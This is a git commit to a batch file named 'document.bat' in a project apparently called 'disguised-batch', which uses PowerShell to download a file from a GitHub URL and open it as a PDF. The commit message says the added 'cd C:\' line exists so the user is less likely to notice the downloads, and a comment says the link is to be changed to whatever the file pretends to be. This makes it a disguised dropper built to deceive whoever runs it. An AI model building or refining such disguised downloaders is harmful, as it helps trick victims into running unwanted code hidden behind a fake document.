6b61a97810df9cf693d61063bae7260253091abd
HaydenPhillips777 <hlphillips1@ualr.edu>
2025-02-11 11:45:14 -0600

    Changed Target Directory
    Added a line to set the active directory to the C: drive. This is just so the user is less likely to notice the .bat and .pdf file being downloaded.

--- document.bat
+++ document.bat
@@ -1,4 +1,5 @@
 @echo off
+cd C:\
 REM change the link below to whatever this file is supposed to pretend to be
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.pdf -OutFile document.pdf"
 document.pdf
